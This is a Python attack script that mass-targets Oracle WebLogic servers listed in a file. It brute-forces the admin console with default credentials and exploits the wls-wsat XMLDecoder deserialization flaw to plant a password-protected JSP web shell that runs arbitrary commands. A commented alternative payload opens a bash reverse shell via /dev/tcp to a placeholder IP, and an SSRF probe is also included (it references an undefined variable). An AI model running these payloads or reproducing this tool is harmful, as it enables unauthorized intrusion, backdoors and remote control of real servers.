#!/usr/bin/env python
# coding: utf-8
#Authon:phyb0x
#weblogic weak_passwd/wls/ssrf

import requests

def weak_passwd(ip):
	users = ['weblogic','admin','system','mary','wlcsystem','wlpisystem']
	passwds = ['password','Oracle@123','weblogic','security','wlcsystem','wlpisystem']
	try:
		target = 'http://' + ip + '/console/j_security_check'
		headers = {
		'Host': ip,
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
		}
		for user in users:
			for passwd in passwds:
				data = {'j_username':user,'j_password':passwd}
				r = requests.post(url=target,data=data,headers=headers,timeout=5)
				if r.text.count('注销') != 0:
					print('[+]' + ip + '	登录成功' + 'user:{}  passwd:{}'.format(user,passwd))
	except Exception as e:
		print('[+]' + ip + '	失败')


def wls_unser(ip):
	try:
		url = 'http://' + ip + '/wls-wsat/CoordinatorPortType'
		target = 'http://' + ip + '/bea_wls_internal/index.jsp'
		headers = {
		'Content-Type': 'text/xml',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
		}
		'''反弹shell请替换data以及接收端ip

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/21 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>'''
		data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
					<soapenv:Header>
					<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
					<java><java version="1.4.0" class="java.beans.XMLDecoder">
					<object class="java.io.PrintWriter"> 
					<string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/index.jsp</string>
					<void method="println"><string>
					<![CDATA[<%   if("wahaha".equals(request.getParameter("password"))){  
					java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("command")).getInputStream();  
					int a = -1;  
					byte[] b = new byte[2048];  
					out.print("<pre>");  
					while((a=in.read(b))!=-1){  
						out.println(new String(b));  
					}  
					out.print("</pre>");  
					} %>]]>
					</string>
						</void>
					<void method="close"/>
					</object></java></java>
					</work:WorkContext>
					</soapenv:Header>
					<soapenv:Body/>
				</soapenv:Envelope>'''
		r = requests.post(url=url,data=data,headers=headers,timeout=4)
		res = requests.get(url=target,headers=headers,timeout=4)
		if res.status_code == 200 :
			print('[+] shell:' + target)
	except Exception as e:	
		print('[+]'+ ip + '	失败')

def ssrf(ip):
	try:
		#payload =input('payload:')
		target = 'http://' + ip + '/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator={}'.format(payload)
		if payload == '':
			target = 'http://' + ip + '/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001'
			headers = {
			'Content-Type': 'text/xml',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
			}
			res = requests.get(url=target,headers=headers,timeout=4)
			if res.status_code == 200 and 'Oracle WebLogic Server' in res.text:
				print('[+]' + ip + '	存在ssrf')
		else:
			print(res.text) 
	except Exception as e:
		print('[+]' + ip + '	失败')


if __name__ == '__main__':
	with open(r'ip.txt','r') as f:
		for ip in f.readlines():
			ip = ip.strip()	
			wls_unser(ip)
			weak_passwd(ip)
			ssrf(ip)